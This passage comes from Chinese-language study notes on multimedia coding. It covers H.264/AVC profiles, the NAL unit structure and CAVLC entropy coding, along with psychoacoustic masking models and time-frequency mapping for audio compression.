The encoding process is <strong>NOT</strong> specified in MPEG coding standard.<br>
MPEG-1 allows B frames.<br>
P frames require <strong>LESS</strong> data than I frames because of temporal prediction.<br>
In video coding the position of slices may change from picture to picture.<br>
In video coding <strong>the Picture header</strong> specifiles the temporal reference parameter</p>
</blockquote>
<h1>🍂H.264-MPEG4-AVC（高级视频编码）</h1>
<blockquote>
<p>[!hint] 考点 33：H.264 编码结构、基线档次、主档次、向量块大小、新特性、视频编码层级和网络抽象层</p>
</blockquote>
<p>在过去十年中，视频编码领域最重要的发展之一是由 ITU 和 ISO/IEC 的联合视频团队（Joint Video Team，JVT）定义的 H.264/MPEG-4 AVC 标准。ITU 从 1997 年开始使用新的编码工具开展了 H.26L（for long term）的工作。结果令人印象深刻，因此 ISO/IEC 决定与 ITU 合作，采用一个共同的标准，成立了联合视频团队。ITU 于 2003 年 5 月批准了新的 H.264 标准。ISO 于 2003 年 10 月批准了该标准，命名为 MPEG-4 第 10 部分，即高级视频编码（AVC）。</p>
<p>块框图和特性：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110224654.webp" alt="image.png"></p>
<p>H.264/AVC 在压缩效率方面取得了重大突破，通常相对于 MPEG-2 和 MPEG-4 简单档次实现了大约 2 倍的压缩比。</p>
<p>在 H.264 标准化时，它支持三种档次（profiles）：基线档次、主要档次和扩展档次。</p>
<ul>
<li>后来，一项名为保真度范围扩展（FRExt）的修正引入了四个额外的配置，称为高级档次。</li>
<li>最初，基本档次和主档次引起了最大的关注。</li>
</ul>
<p>基本档次需要较少的计算和系统内存，并且针对低延迟进行了优化：</p>
<ul>
<li><span style="color:#ff0000">基本档次不包括 B 帧（由于固有时延）</span>或 <strong>CABAC（由于计算复杂性</strong>）。</li>
<li>基本档次非常适合视频电话应用以及其他需要成本效益的实时编码应用。</li>
</ul>
<p>主档次旨在为广播和内容存储应用提供尽可能高的视频质量和最低的比特率。</p>
<p>标准编解码器中的关键压缩特性：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110231714.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110231651.webp" alt="image.png"></p>
<p>应用趋势：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110232210.webp" alt="image.png"></p>
<h2>H.264/AVC 的目标和应用</h2>
<p>视频编码专家组（VCEG），ITU-T SG16</p>
<ul>
<li>H.26L 项目（1998 年初），最初的重点是视频会议和电话通信。</li>
<li>目标是将编码效率提高一倍，超过任何其他现有的视频编码标准。<br>
应用领域：</li>
<li>有线、卫星、地面数字视频广播</li>
<li>媒体存储、DVD、蓝光 DVD 等</li>
<li>互联网流媒体、视频电话在 3G/4G 网络上</li>
<li>视频会议</li>
<li>数字视频监控、数字电影等</li>
</ul>
<h2>与其他标准的关系</h2>
<p>在 ITU-T 和 MPEG 中都将批准相同的设计。</p>
<p>在 ITU-T 中，这将是一个新的独立标准：</p>
<ul>
<li>ITU-T 推荐标准 H.264。</li>
<li>ITU-T 系统（H.32x）将进行修改以支持它。<br>
在 MPEG 中，这将是 MPEG-4 套件中的一个新的“部分”：</li>
<li>与之前的 MPEG-4 视觉编解码器设计分开。</li>
<li>新的第 10 部分称为“高级视频编码”（类似于 MPEG-2 中的“AAC”位置，作为独立的编解码器）。<br>
与之前的标准不兼容（包括之前的 MPEG-4 视觉规范 - 核心技术不同）。<br>
MPEG-4 系统/文件格式正在进行修改以支持它。<br>
IETF 正在研究 RTP 有效载荷的封装。</li>
</ul>
<h2>新功能和共同元素</h2>
<p>视频编码层基于混合视频编码（hybrid video coding），与其他标准在理念上类似，但存在重要的区别。</p>
<p>新的关键功能包括：</p>
<ul>
<li>增强的运动补偿</li>
<li>用于变换编码的小块</li>
<li>改进的去块滤波器</li>
<li>增强的熵编码</li>
</ul>
<p>与之前的标准相比，H.264/AVC 具有以下共同元素：</p>
<ul>
<li>16x16 宏块</li>
<li>块运动位移</li>
<li>块变换</li>
<li>标量量化</li>
<li>I、P 和 B 帧类型<br>
相对于之前的标准，在相同感知质量下，H.264/AVC 可以实现约 50% 的比特率节省。</li>
</ul>
<h2>档次</h2>
<p>受限基准档次（Constrained Baseline Profile，CBP）：</p>
<ul>
<li>主要用于视频会议和移动应用等低成本应用，于 2009 年开发。</li>
<li>对应于基准档次、主档次和高级档次之间共同支持的功能子集。</li>
</ul>
<p>基准档次（Baseline Profile，BP）：</p>
<ul>
<li>主要用于需要额外数据丢失鲁棒性的低成本应用，如视频会议和移动应用。</li>
<li>包括所有受限基准档次支持的功能，以及用于提高鲁棒性的额外功能。</li>
<li>所有受限基准档次的比特流也被视为基准档次的比特流，因为这两个档次共享相同的档次标识码值。</li>
</ul>
<p>主档次（Main Profile，MP）：</p>
<ul>
<li>用于使用 MPEG-4 格式的标准定义数字电视广播，符合 DVB 标准定义。</li>
</ul>
<p>扩展档次（Extended Profile，XP）：</p>
<ul>
<li>用于流媒体视频档次。</li>
<li>具有相对较高的压缩能力和一些额外的技巧，以提高对数据丢失和服务器流切换的鲁棒性。</li>
</ul>
<p>高级档次（High Profile，HiP）：</p>
<ul>
<li>于 2004 年开发，用于广播和光盘存储应用，特别适用于高清电视应用（例如，已被蓝光光盘存储格式和 DVB 高清电视广播服务采用）。</li>
</ul>
<p>高 10 档次（High 10 Profile，Hi10P）：</p>
<ul>
<li>在高级档次的基础上增加了对每个样本解码图像精度高达 10 位的支持。</li>
</ul>
<p>高 4:2:2 档次（High 4:2:2 Profile，Hi422P）：</p>
<ul>
<li>针对使用隔行视频的专业应用。</li>
<li>在高 10 档次的基础上增加了对 4:2:2 色度子采样格式的支持，同时使用高达 10 位的解码图像精度。</li>
</ul>
<p>高 4:4:4 预测档次（High 4:4:4 Predictive Profile，Hi444PP）：</p>
<ul>
<li>在高 4:2:2 档次的基础上增加了对 4:4:4 色度采样的支持，每个样本的解码图像精度高达 14 位。</li>
<li>此外，还支持高效的无损区域编码和将每个图像编码为三个独立的色彩平面。</li>
</ul>
<h3>基准档次</h3>
<p>特点包括：</p>
<ul>
<li><span style="color:#ff0000"> I 和 P 帧类型（不包括 B 帧，因为时延较大）</span></li>
<li>循环内去块滤波器</li>
<li>1/4 像素级的运动补偿</li>
<li>基于树状结构的运动分割，最小块大小为 4x4</li>
<li>基于 VLC 的熵编码</li>
</ul>
<p>一些增强的错误容忍特性包括：</p>
<ul>
<li>灵活的宏块排序/任意切片排序</li>
<li>冗余切片</li>
<li>主要用于视频会议和无线应用</li>
</ul>
<h3>主档次</h3>
<p>主档次的特点包括：</p>
<ul>
<li>所有基准档次的特点，除了增强的错误容忍特性</li>
<li><span style="color:#ff0000">B 帧类型</span></li>
<li><span style="color:#ff0000">CABAC（上下文自适应二进制算术编码）</span></li>
<li>宏块级别的帧/场切换</li>
<li>对 B 帧和 P 帧预测进行自适应加权</li>
<li>支持隔行图像扫描</li>
</ul>
<p>主档次主要用于广播应用。</p>
<h2>基本宏块编码结构</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110233820.webp" alt="image.png"></p>
<h2>运动补偿</h2>
<p>运动补偿的特点包括：</p>
<ul>
<li>不同的块大小和形状用于运动补偿</li>
<li>1/4 像素精度
<ul>
<li>6 点滤波器用于 1/2 像素精度</li>
<li>简化滤波器用于 1/4 像素精度</li>
</ul>
</li>
<li>多个参考帧</li>
<li>时间反转运动和广义 B 帧</li>
<li>B 帧预测加权</li>
</ul>
<h2>H.264/AVC 编码数据格式</h2>
<p>H.264 区分视频编码层（VCL）和网络抽象层（NAL）。</p>
<p>编码过程的输出是 VCL 数据（表示编码视频数据的一系列比特），在传输或存储之前将其映射到 NAL 单元。</p>
<p>分别指定 VCL 和 NAL 的目的是区分编码特定的功能（在 VCL 中）和传输特定的功能。</p>
<p>每个 NAL 单元包含原始字节序列负载（RBSP），即对应于编码视频数据的一组数据和头部信息。</p>
<p>编码的视频序列由一系列 NAL 单元表示，可以通过基于数据包的网络、比特流传输链路或存储在文件中进行传输。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110233942.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110234417.webp" alt="image.png|375"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110234420.webp" alt="image.png|300"></p>
<p>NAL 单元的第一个字节是一个头部，包含有关该包类型的信息。</p>
<pre><code class="language-c">ubyte forbidden_bit: 1; // set to 0
ubyte nal_ref_idc:2; // the level of priority
ubyte nal_unit_type:5; // NAL type
</code></pre>
<table>
<thead>
<tr>
<th>Type</th>
<th>Defintion</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Undefined</td>
</tr>
<tr>
<td>1</td>
<td>Slice layer without partitioning non <span style="color:#ff0000">IDR（instaneous decoding refresh 立即编码刷新）</span></td>
</tr>
<tr>
<td>2</td>
<td>Slice data partition A layer <span style="color:#ff0000">（Partition A：片头信息，片里面宏块头信息，最重要）</span></td>
</tr>
<tr>
<td>3</td>
<td>Slice data partition B layer <span style="color:#ff0000">（Partition B：帧内编码的数据）</span></td>
</tr>
<tr>
<td>4</td>
<td>Slice data partition C layer <span style="color:#ff0000">（Partition C：帧间编码的数据）</span></td>
</tr>
<tr>
<td>5</td>
<td>Slice layer without partitioning IDR</td>
</tr>
<tr>
<td>6</td>
<td>Additional information (SEI) 时间信息</td>
</tr>
<tr>
<td>7</td>
<td>Sequence parameter set 序列参数集（序列编号、帧数、参考帧数目、图像大小、场模式）</td>
</tr>
<tr>
<td>8</td>
<td>Picture parameter set 图像参数集（图像编号、熵编码方式、条带数目、初始量化步长）</td>
</tr>
<tr>
<td>9</td>
<td>Access unit delimiter</td>
</tr>
<tr>
<td>10</td>
<td>End of sequence</td>
</tr>
<tr>
<td>11</td>
<td>End of stream</td>
</tr>
<tr>
<td>12</td>
<td>Filler data</td>
</tr>
<tr>
<td>13..23</td>
<td>Reserved</td>
</tr>
<tr>
<td>24..31</td>
<td>Undefined</td>
</tr>
</tbody>
</table>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110235130.webp" alt="image.png"></p>
<h2>参考图片</h2>
<p>H.264 编码器可以使用一到两个先前编码的图片作为参考，用于对每个帧间编码的宏块或宏块分区进行运动补偿预测。</p>
<p>这使得编码器可以从比先前编码的图片更广泛的图片集中搜索当前宏块分区的最佳匹配。</p>
<p>编码器和解码器各自维护一个或两个参考图片列表，其中包含先前已编码和解码的图片（出现在当前图片之前和/或之后的显示顺序中）。</p>
<ul>
<li>P 帧中的帧间编码的宏块和宏块分区是从单个列表（列表 0）中的图片进行预测的。</li>
<li>B 帧中的帧间编码的宏块和宏块分区可以从两个列表（列表 0 和列表 1）中的图片进行预测。</li>
</ul>
<h2>Slices</h2>
<p>一个视频图像被编码为一个或多个切片，每个切片包含从 1 个宏块到图像中的总宏块数的整数个宏块（每个图像一个切片）。</p>
<p>切片中的宏块数不需要在图像内是恒定的。编码切片之间的相互依赖性很小，这有助于限制错误的传播。</p>
<p>符合基准配置的比特流包含编码的 I 和/或 P 切片：</p>
<ul>
<li>I 切片只包含帧内编码的宏块（从同一切片中先前编码的样本进行预测）；</li>
<li>P 切片可以包含帧间编码的宏块（从先前编码的图片中的样本进行预测）、帧内编码的宏块或跳过的宏块。<br>
编码图像可以由不同类型的切片组成：</li>
<li>基准档次的编码图像可以包含 I 和 P 切片的混合；</li>
<li>主档次或扩展档次的图像可以包含 I、P 和 B 切片的混合。<br>
切片数据包括切片头、一系列编码的宏块和/或跳过的宏块的指示。<br>
切片头定义了切片类型和切片所属的编码图像，并可能包含与参考图片管理相关的指令。</li>
</ul>
<blockquote>
<p>[!hint] 考点 34：帧内预测、运动向量预测、帧间预测</p>
</blockquote>
<blockquote>
<p>[!hint] 考点 35：H.264 的 DCT 变换</p>
</blockquote>
<blockquote>
<p>[!hint] 考点 36：熵编码：指数格罗姆编码和 CAVLC</p>
</blockquote>
<h2>CAVLC</h2>
<p>这是用于编码变换系数的残差和之字形有序块的方法。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111134717.webp" alt="image.png"></p>
<p>CAVLC（Context-Adaptive Variable Length Coding）旨在利用量化的 4×4 块的几个特点：</p>
<ul>
<li>在预测、变换和量化之后，块通常是稀疏的（主要包含零）。</li>
<li>在之字形扫描后，最高的非零系数通常是 +/-1 的序列。</li>
<li>相邻块中的非零系数的数量是相关的。</li>
<li>非零系数的级别（幅度）在之字形扫描开始时往往较高，并且随着频率增高而降低。</li>
</ul>
<p>对一块变换系数进行 CAVLC 编码的过程如下：</p>
<ol>
<li>编码系数的数量和尾部的 1。</li>
<li>编码每个尾部 1 的符号。</li>
<li>编码剩余非零系数的级别。</li>
<li>编码最后一个系数之前的零的总数。</li>
<li>编码每个零的连续出现次数。</li>
<li>编码系数的数量和尾部的 1<br>
第一步是编码非零系数的总数（NumCoef）和尾部的 1（T1s）。<br>
NumCoef 的取值范围可以是从 0（4x4 块中没有系数）到 16（16 个非零系数）。<br>
T1s 的取值范围可以是从 0 到 3。<br>
如果尾部的 +/- 1 的个数超过 3 个，只有最后 3 个被视为“特殊情况”，其他的被编码为普通系数。</li>
</ol>
<p>例如：4x4 块</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111135021.webp" alt="image.png"></p>
<p>The Num-Coef = 7, and T1s = 3</p>
<p>用于编码 Num_Coeff 和 T1 的四个表格分别是 Num-VLC0、Num-VLC1、Num-VLC2 和 FLC。</p>
<p>Num-VLC0：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111135118.webp" alt="image.png"></p>
<p>表格的选择取决于先前编码块中，上方和左方的非零系数的数量 NU 和 NL。</p>
<p>参数 N 的计算如下：</p>
<ul>
<li>如果块 U 和 L 都可用（即在同一个编码片中），N = (NU + NL) / 2。</li>
<li>如果只有块 U 可用，N = NU。</li>
<li>如果只有块 L 可用，N = NL。</li>
<li>如果两者都不可用，N = 0。</li>
</ul>
<p>表格的选择基于以下方式中的 N 值：</p>
<table>
<thead>
<tr>
<th>N</th>
<th>Selected Table</th>
</tr>
</thead>
<tbody>
<tr>
<td>0,1</td>
<td>Num-VLC0</td>
</tr>
<tr>
<td>2,3</td>
<td>Num-VLC1</td>
</tr>
<tr>
<td>4,5,6,7</td>
<td>Num-VLC2</td>
</tr>
<tr>
<td>8 or above</td>
<td>FLC</td>
</tr>
</tbody>
</table>
<p>FLC 的形式如下：xxxxyy（即 6 位）</p>
<p>其中 xxxx 和 yy 分别表示 Num_Coeff 和 T1。</p>
<ol start="2">
<li>
<p>对每个 T1 编码其尾随 1 的符号<br>
对于每个 T1，一个比特位编码其符号（0 表示正，1 表示负）。<br>
这些符号按照逆序编码，从最高频率的 T1 开始。</p>
</li>
<li>
<p>对剩余的非零系数编码其级别（符号和大小）<br>
 块中每个剩余的非零系数的级别（符号和大小）按照逆序进行编码。<br>
 选择用于编码每个级别的 VLC 表根据每个连续编码级别的大小进行自适应调整（上下文自适应）。<br>
 有 7 个可供选择的 VLC 表，从 Level_VLC0 到 Level_VLC6。<br>
 Level_VLC0 偏向较低的大小，Level_VLC1 偏向稍高的大小，依此类推。<br>
 初始化表格为 Level_VLC0（除非非零系数超过 10 个且尾随 1 少于 3 个，在这种情况下从 Level_VLC1 开始）。<br>
 编码最高频率的非零系数。<br>
 如果该系数的大小大于预定义的阈值，则切换到下一个 VLC 表。</p>
</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111135814.webp" alt="image.png"></p>
<p> 级别的选择与最近编码的系数的大小相匹配。阈值列在表中；</p>
<p> 第一个阈值为零，这意味着在编码第一个系数级别之后，表总是递增。</p>
<ol start="4">
<li>编码最后一个系数之前的零的总数。</li>
</ol>
<p>以下是用于编码最后一个系数之前的零的总数（TotZeros）的表格。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111135924.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111135948.webp" alt="image.png"></p>
<ol start="5">
<li>编码每个零的连续出现次数<br>
在每个非零系数之前的零的数量（run_before）按照逆序进行编码。对于每个非零系数，除了以下两种情况外，都会编码一个 run_before 参数：<br>
(a) 如果没有更多的零需要编码；<br>
(b) 对于最后（最低频率）的非零系数，不需要编码 run_before。</li>
</ol>
<p>每个零的连续出现次数的 VLC 表的选择取决于：</p>
<p>(a) 尚未编码的零的数量（ZerosLeft）；</p>
<p>(b) run_before。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111140035.webp" alt="image.png"></p>
<p>例子：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111140120.webp" alt="image.png"></p>
<p>考虑以下 4×4 帧间残差块</p>
<p>块的 Zigzag 重新排序如下所示：</p>
<p>0,3,0,1,-1,-1,0,1,0,0,0,0,0,0,0,0</p>
<p>因此，NumCoeff=5，TotZero=3，T1s=3</p>
<p>假设 N=1</p>
<p>编码：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111140327.webp" alt="image.png"></p>
<p>解码：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231111140403.webp" alt="image.png"></p>
<h1>心理声学模型</h1>
<blockquote>
<p>[!Hint] 考点 19：心理声学模型：频域掩蔽、时域掩蔽、听觉阈值、SMR、关键带宽、巴克刻度、感知熵</p>
</blockquote>
<h2>声压等级 Sound Pressure Levels</h2>
<p>声音以压力波的形式到达人耳。声压 $p$ 在 $[10^-5,10^2]$Pa 范围之间变化。</p>
<p>声压等级 SPL，单位 dB：</p>
<p>$$<br>
SPL= 10 \log_{10}{\left( \frac{p}{p_{0}} \right)^2}, p_{0}=20\mu Pa<br>
$$</p>
<p>p0 为音频在 2kHz 左右的听觉阈值处的声压。</p>
<p>声音也可以被声音强度 $I$ 来描述，表示声波单位面积的功率，与 p 的平方成正比。</p>
<p>声压等级 SPL 也可以被定义为：</p>
<p>$$<br>
SPL= 10 \log_{10}{\left( \frac{I}{I_{0}} \right)}, I_{0}=10^{-12}W/m^2<br>
$$</p>
<p>$I_0$ 和 $p_0$ 对应。</p>
<h2>响度 Loudness</h2>
<p>响度等级定义为，在正面入射平面场下，被感知到的与所检测的声音一样响亮的 1 kHz 声音的级别。</p>
<p><span style="color:#ff0000">响度取决于强度、持续时间、时间和频谱结构。</span></p>
<p>单位为 phon，描述了自变量为频率的函数中一条等响曲线。下图每条曲线指的是同样的响度。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105213848.webp" alt="image.png"></p>
<p>在高音量水平下，以 phon 为单位测量的响度与以 dB 为单位测量的声强之间的差异减小。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105214437.webp" alt="image.png"></p>
<h2>掩蔽现象</h2>
<h3>同时掩蔽（频域掩蔽）</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105214640.webp" alt="image.png|450"></p>
<blockquote>
<p>频域掩蔽是指在掩蔽声与被掩蔽声同时存在时产生的掩蔽效应，又称为同时掩蔽。在这种情况下，掩蔽声在掩蔽效应发生期间持续影响着被掩蔽声，形成一种强烈的掩蔽效应。通常情况下，频域中的一个强音会掩盖附近较弱的声音，而距离强音较近的弱音往往更容易被掩蔽；相反地，距离较远的弱音不太容易受到掩蔽效应的影响。图 3 解释了频域掩蔽现象，可以看到一个强信号掩蔽了两个接近其频率的弱信号，低于掩蔽域值的弱信号将无法听见，这导致听觉的安静阈值在掩蔽作用下提高。一般来说，低频声音更容易掩蔽高频声音。</p>
</blockquote>
<h3>非同时掩蔽（时域掩蔽）</h3>
<blockquote>
<p>时域掩蔽效应是在时域中相邻的声音之间互相的掩蔽效应，或被称为非同时掩蔽。时域掩蔽又分为超前掩蔽（pre-masking 或 backward masking）和滞后掩蔽（post-masking 或 forward masking）</p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105214835.webp" alt="image.png|500"></p>
<p>虚线之间是掩蔽声音实际的存在时间。</p>
<blockquote>
<p>声音信号大多数时候是非稳态的瞬时信号，声压级随着时间变化很快，即强音后面跟着弱音，弱音后面又可能跟着强音。比较强的声音往往会掩蔽随后到来的较弱音。时域掩蔽又分为前掩蔽和后掩蔽。若掩蔽声音出现之前的一段时间内发生掩蔽效应，则称为前掩蔽；否则称为后掩蔽。前掩蔽效应要大于后掩蔽效应，前掩蔽发生作用的时间大于后掩蔽的时间。产生时域掩蔽的主要原因是人的大脑处理信息需要花费一定的时间，时域掩蔽也随着时间的推移很快衰减，是一种弱掩蔽效应。</p>
</blockquote>
<h3>窄带噪声掩蔽</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105214923.webp" alt="image.png|450"></p>
<p>信号掩蔽比（signal to mask ratio, SMR）。</p>
<blockquote>
<p>注意：信噪比是 SNR（Signal-to-noise ratio）</p>
</blockquote>
<blockquote>
<p>窄带噪声通常是指带宽等于或者小于听觉临界频带的噪声。在图 1 中，以不同中心频率的窄带噪声作为掩蔽声时的听阈曲线，窄带噪声的中心频率分别为 0.25KHz，1KHz，4KHz，带宽分别为 0.1KHz、0.16KHz 和 0.7KHz，图上部水平虚线为掩蔽噪声声强级 60dB，中部实线表示刚好可听到的纯音声级，下部的虚线是听觉安静域值。从图中可以看出，被掩蔽纯音的频率偏离掩蔽噪声中心频率越大，掩蔽效应下降越快；因为是平滑以后的数据，故而不呈锯齿状。信号分量和掩蔽域值之间的声级差，称信号掩蔽比 (signal to mask ratio, SMR)，SMR 越大，掩蔽效果越小。上图中，0.25KHz，1KHz，4KHz 的最小 SMR 分别为 2、3 和 5dB，最小 SMR 是设计音频编码器很重要的参数。</p>
</blockquote>
<p>下图表示不同级别的掩蔽音调下，1kHz 窄带噪声掩蔽器的掩蔽阈值。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105215907.webp" alt="image.png"></p>
<h3>纯音掩蔽</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105220158.webp" alt="image.png"></p>
<blockquote>
<p>从图中可以看出，当被掩蔽音声级较低时，掩蔽域值向低频扩展（斜率较小）；而在声级较高时则相反。当掩蔽音声级为 90dB 时，掩蔽曲线峰值为 75dB，信号掩蔽比为 15dB。与噪声相比，纯音在掩蔽方面具有较大的信号掩蔽比（SMR），这意味着噪声比纯音具有更好的掩蔽效果。纯音的掩蔽效应基本符合以下几个规律：低频纯音容易掩蔽高频纯音，而高频纯音相对较难掩蔽低频纯音；频率相近的纯音容易互相掩蔽；当增加掩蔽声的声压级时，掩蔽阈值会提高，同时被掩蔽的频率范围也会扩展。</p>
</blockquote>
<h3>临界带宽</h3>
<blockquote>
<p>临界带宽指临界频带的带宽，即恰能产生变化的频率通带（频段）的宽度值。如响度测试中指恰能使声音响度产生变化的带宽值：当声音由一定频带组成时，它的响度变化呈现出下图所示的规律：带宽从很窄到越来越宽的过程中，声音整体响度开始时保持不变；当到达一个特定的带宽后，声音整体响度会随着带宽的变宽而变得更响。<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231106201541.webp" alt="image.png|275"></p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106200607.webp" alt="image.png"></p>
<p>Threshold of a narrow band noise centered between two sinusoidal maskers at a level of 50dB as a function of the frequency separation between the two sinusoidals.</p>
<h3>掩蔽 Masking</h3>
<p><strong>掩蔽曲线的水平在接近遮蔽音调频率的地方最高</strong>。</p>
<p>当测试信号频率超过临界带宽远离遮蔽音调频率时，掩蔽曲线迅速下降。</p>
<p><strong>掩蔽频率曲线的形状取决于掩蔽音调的频率和水平</strong>。</p>
<p>掩蔽曲线在很大程度上取决于掩蔽音调是音调还是噪声样式。</p>
<h2>音频编码的心理声学模型</h2>
<h3>巴克刻度 Bark Scale</h3>
<blockquote>
<p>巴克刻度是一种心理声学的尺度。</p>
<p>临界频带指的是由于耳蜗构造产生的听觉滤波器的频率带宽。听觉系统中，耳蜗起着频谱分析的作用，基底膜上特定位置点是对某一特征频率（Characteristic Frequency, CF）的响应最大，当声波偏离 CF 时，该点的响应减少，因此基底膜上每一点可等效成具有特定中心频率（CF）的带通滤波器，整个听觉系统可等效成一系列具有连续 CF 的、相互交叠的带通滤波器，称为“听觉滤波器”。临界频带就是听觉系统带通滤波功能的反映，听觉滤波器的带宽即为临界带宽。</p>
<p>概括地说，临界频带是声音频率带，在临界频带中第一个单音感知度会被第二单音的听觉掩蔽所干扰。根据相关的心理声学的研究，由于人耳的特殊结构，在同一个临界频带内信号容易发生掩蔽效应，即：主要信号容易被能量大并且频率接近的掩蔽信号所掩蔽。因此我们可以认为 Bark 域越近的信号越容易产生掩蔽效应。</p>
<p>声学研究中，人们使用听觉滤波器来模拟不同的临界频带。后来研究者发现人耳结构大致会对 24 个频率点产生共振，根据这个结论 Eberhard Zwicker 在 1961 年针对人耳特殊结构提出：信号在频带上也呈现出 24 个临界频带，分别从 1 到 24。这就是 Bark 域。</p>
<p>通常将人耳可听范围内的 20Hz～16kHz 分成 24 个临界频带，用临界频带级来表示临界频带的宽度，单位为巴克（Bark）：Bark=一个临界频带的宽度。当频率 f＜500Hz 时，1 Bark=f/100，临界带宽几乎恒定为 100Hz；当频率 f＞500Hz 时，1 Bark=4log(f/100)， 临界带宽随中心频率的升高而增加，约为中心频率的 20%。<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231106202935.webp" alt="image.png|500"></p>
</blockquote>
<p>每个临界带宽（频率）对应于耳朵中基底膜上的固定距离。我们可以定义基底距离测量中的长度单位为一个临界带宽。</p>
<h3>掩蔽传播模型</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106202329.webp" alt="image.png"></p>
<p>Excitation patterns for narrow-band noise signals centered at different frequencies and at a level of 60 dB.</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106203058.webp" alt="image.png"></p>
<p>Excitation patterns for narrow-band noise signals centered at 1kHz and at different levels.</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106203147.webp" alt="image.png"></p>
<p>The curve in the diagram be expressed as a function of the Bark scale difference between the maskee and masker frequency.</p>
<h3>掩蔽曲线</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106203258.webp" alt="image.png|475"></p>
<h3>MP3 的心理声学模型</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106203341.webp" alt="image.png|379"></p>
<h3>感知熵</h3>
<p>感知熵（Perceptual entropy）PE：在不引入任何感知差异的情况下，对信号进行编码所需的每个频率样本的平均比特数。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231126174641.webp" alt="image.png"></p>
<p>$n_b$ 是分区带 b 中的频率线数量，$energy_b$ 是分区 b 中的信号能量，$threshold_b$ 是掩蔽阈值。</p>
<p>PE 可以用于确定 MDCT 或 attack 的块类型（PE&gt;1800 比特表示短窗口）</p>
<h3>Block Switching State Diagram</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106203917.webp" alt="image.png|479"></p>
<h2>本章参考的外部资源</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/647121839">心理声学声掩蔽效应及应用 - 知乎 (zhihu.com)</a></li>
<li><a href="http://www.heacad.cn/NewsDetail/3240260.html">听力学小课堂 | 名词释义（15）：临界带宽、临界频带-苏州海卡缔听力技术有限公司 (heacad.cn)</a></li>
<li><a href="https://blog.csdn.net/qq_34218078/article/details/125145458">声学感知刻度(mel scale、Bark scale、ERB)与声学特征提取(MFCC、BFCC、GFCC)_hz2erb_凌逆战的博客-CSDN博客</a></li>
<li><a href="https://www.bilibili.com/video/BV1D5411S71K/?spm_id_from=333.999.0.0&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">mp3是如何骗过你耳朵的？【差评君】_哔哩哔哩_bilibili</a></li>
</ul>
<h1>🍂时频映射</h1>
<p>音频编码框图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110202133.webp" alt="image.png"></p>
<p>T/F mapping: FFT, PQMF, MDCT</p>
<p>傅里叶变换</p>
<ul>
<li>
<p>1822 年，傅里叶指出实时信号可以表示为具有不同频率的信号的总和。</p>
</li>
<li>
<p>傅里叶变换定义如下：<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231110202311.webp" alt="image.png"></p>
</li>
<li>
<p>傅里叶逆变换等于：<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231110202315.webp" alt="image.png"></p>
</li>
</ul>
<p>傅里叶级数</p>
<ul>
<li>
<p>对信号在有限时间间隔上的傅里叶变换可以用来在时域中重构原始信号。</p>
</li>
<li>
<p>实际上，我们不需要完整的傅里叶变换数据来完全在时域中重构信号。</p>
</li>
<li>
<p>我们只需要在离散频率点 f=k/T（其中 k 是整数）处的 X(f) 值。</p>
</li>
<li>
<p>我们通过将窗口信号替换为在时间间隔从 -T/2 到 T/2 内相等的信号，但在该间隔之外周期性地重复，来进行数据压缩。<br>
对于生成的周期信号，我们可以定义傅里叶级数：<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231110202643.webp" alt="image.png"></p>
</li>
<li>
<p>$X[k]$ 只是时间限定信号在离散频率集合 $f=k/T$ 处的傅里叶变换。</p>
</li>
<li>
<p>我们可以使用以下公式重构 x(t)：<img src="https://cdn.gallery.uuanqin.top/img/20231110202703.webp" alt="image.png"><br>
采样定理</p>
</li>
<li>
<p>假设一个信号在频率范围从 -Fmax 到 Fmax 内具有频率内容。</p>
</li>
<li>
<p>如果我们选择某个频率间隔 Fs≥2Fmax，并周期性地延续信号的频谱范围超出从 -Fs/2 到 Fs/2 的范围。</p>
</li>
<li>
<p>从傅里叶级数的定义可以想象，这个频率周期函数只有离散时间分量 $x[n]$（如果我们定义 $T=1/F_s$，则有 $x[n]=x(nT)$）。</p>
</li>
</ul>
<p>在时域中对信号进行窗函数处理</p>
<ul>
